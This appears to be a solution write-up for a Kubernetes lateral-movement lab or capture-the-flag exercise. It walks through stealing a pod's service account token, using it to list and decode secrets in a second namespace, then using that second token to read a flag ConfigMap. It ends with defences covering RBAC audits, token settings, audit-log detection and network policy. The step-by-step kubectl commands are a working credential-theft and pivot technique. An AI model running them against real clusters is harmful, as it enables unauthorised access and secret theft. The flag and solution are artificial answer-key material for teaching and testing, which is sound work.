# Solution — Lateral Movement Chain

## Overview

Three hops across three namespaces, each using a stolen service account token:

```
entry-point pod (NS-A)
  → steal foothold-sa token
  → use token to list secrets in NS-B
  → find hop-two-token (api-sa token)
  → use api-sa token to list configmaps in NS-C
  → read final-flag ConfigMap
```

## Step 1 — Steal the foothold token

```bash
# Read the SA token from the compromised pod
FOOTHOLD_TOKEN=$(kubectl exec -n dojo-sec-lateral-a entry-point -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)

CA_CERT=$(kubectl exec -n dojo-sec-lateral-a entry-point -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)

echo "$FOOTHOLD_TOKEN" | cut -c1-50  # verify it's a JWT
```

## Step 2 — Pivot to namespace B

```bash
# foothold-sa has get/list on secrets in dojo-sec-lateral-b
# Use the token to list secrets in namespace B
kubectl get secrets -n dojo-sec-lateral-b \
  --token="$FOOTHOLD_TOKEN" \
  --server=https://kubernetes.default.svc \
  --certificate-authority=<(kubectl exec -n dojo-sec-lateral-a entry-point -- \
      cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)

# Output will show: hop-two-token
# Read it:
kubectl get secret hop-two-token -n dojo-sec-lateral-b \
  --token="$FOOTHOLD_TOKEN" \
  --server=https://kubernetes.default.svc \
  -o jsonpath='{.data.token}' | base64 -d
```

Store the hop-two token:
```bash
HOP_TWO_TOKEN=$(kubectl get secret hop-two-token -n dojo-sec-lateral-b \
  --token="$FOOTHOLD_TOKEN" \
  --server=https://kubernetes.default.svc \
  -o jsonpath='{.data.token}' | base64 -d)
```

## Step 3 — Reach namespace C

```bash
# api-sa (hop-two-token) has get/list on configmaps in dojo-sec-lateral-c
kubectl get configmaps -n dojo-sec-lateral-c \
  --token="$HOP_TWO_TOKEN" \
  --server=https://kubernetes.default.svc

# Read the flag
kubectl get configmap final-flag -n dojo-sec-lateral-c \
  --token="$HOP_TWO_TOKEN" \
  --server=https://kubernetes.default.svc \
  -o jsonpath='{.data.flag}'
```

**Flag:** `KUBE{three_hops_to_node_compromise}`

## Why This Works

Each service account was scoped to the minimum required for its *intended* function, but the attacker:

1. **Started with a foothold**: Any RCE or container exec gives you the pod's SA token
2. **Pivoted using RBAC**: foothold-sa was overpermissioned — it shouldn't need to list secrets in NS-B
3. **Chained tokens**: Each stolen token had just enough access to find the *next* token

## Defense

**RBAC audit** — find all RoleBindings that grant cross-namespace access:
```bash
kubectl get rolebindings,clusterrolebindings -A \
  -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {range .subjects[*]}{.kind}/{.name} in {.namespace} {end}{"\n"}{end}' \
  | grep "ServiceAccount"
```

**Minimal RBAC scope**:
- Never give a pod's SA `list secrets` in another namespace
- Use projected service account tokens with short expiry (`expirationSeconds: 3600`)
- Disable automounting where not needed: `automountServiceAccountToken: false`

**Audit log detection** — look for a single user identity accessing multiple namespaces rapidly:
```bash
# In audit.log: same user.username appearing in multiple namespaces within seconds
grep '"verb":"list","objectRef":{"resource":"secrets"' audit.log \
  | awk -F'"' '{print $NF}' | sort | uniq -c
```

**Network policy** — even with a stolen token, network-level controls limit blast radius. Apply deny-all and allow only required pod-to-pod communication.
